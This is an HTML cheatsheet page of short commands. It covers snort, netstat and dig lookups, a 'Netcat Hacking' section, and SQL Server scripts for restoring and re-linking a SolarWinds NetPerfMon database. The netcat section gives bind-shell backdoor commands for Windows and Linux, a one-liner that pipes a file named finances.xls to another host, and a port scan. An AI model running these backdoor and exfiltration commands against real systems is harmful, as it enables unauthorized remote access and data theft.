
<!DOCTYPE html>
<html>
 <head>
  <style>

pre {
  font-family: monospace;
  background-color: powderblue;
  color:black;
  text-overflow: ellipsis;
  overflow-x: auto;
  white-space: pre-wrap;
  white-space: -moz-pre-wrap;
  white-space: -pre-wrap;
  white-space: -o-pre-wrap;
  word-wrap: break-word;
}    
</style>
 </head>

<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="w3.css">
<meta name="viewport" content="width=device-width, initial-scale=1">
 <body>
<div class="w3-container w3-green">
  <h1>Cheatsheet</h1> 
</div>
<div class="w3-row-padding">
 <div class="w3-third">  
 <p>      
  <pre>snort -i3 -vde -c c:\snort\etc\snort.conf -l c:\snort.log</pre>
 </p>
 </div>
 <div class="w3-third">  
    <p>
  Use netstat to check listening ports on Windows: <pre>netstat -ab | FIND "LISTEN"</pre>
  </p>
  <p>DNS lookup<pre>dig @8.8.8.8 brooksmacdonald.com MX</pre></p>
 <p>Reverse DNS lookup<pre>dig -x 212.58.244.26</pre></p>
 </div>   

<div class="w3-third"> 
 <p>Netcat Hacking</p>
 <p>Listen for inbound connections: <pre>nc -l -p <port></pre></p>
<p>Connect to another machine: <pre>nc options host <ip> <port></pre><p>
<p>Connect to webserver: <pre>nc 192.168.1.105 80<br>HEAD / HTTP/1.0 </pre></p>
<p>Listen for connections: <pre>nc -l -p 6996</pre><br>On windows use same command with upper case L to create a persistent listener that survives a reboot</p>
<p>Create a backdoor: <br>
   For windows: <pre>nc -l -p 6996 -e cmd.exe <br> nc -nnvl -p 80 -e c:\windows\system32\cmd.exe</pre></p><br>
   For Linux: <pre>nc -l -p 6996 -e /bin/bash</pre></p>
<p>Exfiltrate files from target:<br>
 On source system: <pre>type finances.xls | nc 192.168.1.104 6996</pre><br>
On destination system <pre>nc -l -p 6996 > finances.xls</pre></p>
<p>Scan targets ip addresses for open ports:<br>
<pre>nc -nv -w1 <ip> <port range></pre></p>
</div>

<div class="w3-third">  
    <p>
Useful SQL Scripts
12th April 2018 ~ skrggsy06	~ Edit "Useful SQL Scripts"	

restore filelistonly
from NetPerfMon

use master
restore database NetPerfMon
from NetPerfMon with replace, move ‘NetPerfMon’ TO ‘D:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\NetPerfMon.mdf’,
move ‘NetPerfMon_FG1’ TO ‘D:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\NetPerfMon_FG1.mdf’,
move ‘NetPerfMon_FG2’ TO ‘D:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\NetPerfMon_FG2.mdf’,
move ‘NetPerfMon_FG3’ TO ‘D:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\NetPerfMon_FG3.mdf’,
move ‘NetPerfMon_FG4’ TO ‘D:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\NetPerfMon_FG4.mdf’,
move ‘NetPerfMon_log’ TO ‘D:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\NetPerfMon_log.ldf’

CREATE LOGIN [SolarWindsNPM] WITH PASSWORD=********, DEFAULT_DATABASE=[NetPerfMon], DEFAULT_LANGUAGE=[us_english], CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF

USE [NetPerfMon]
ALTER USER [SolarWindsNPM] WITH LOGIN = SolarWindsNPM
 </p></div>     
     </body>
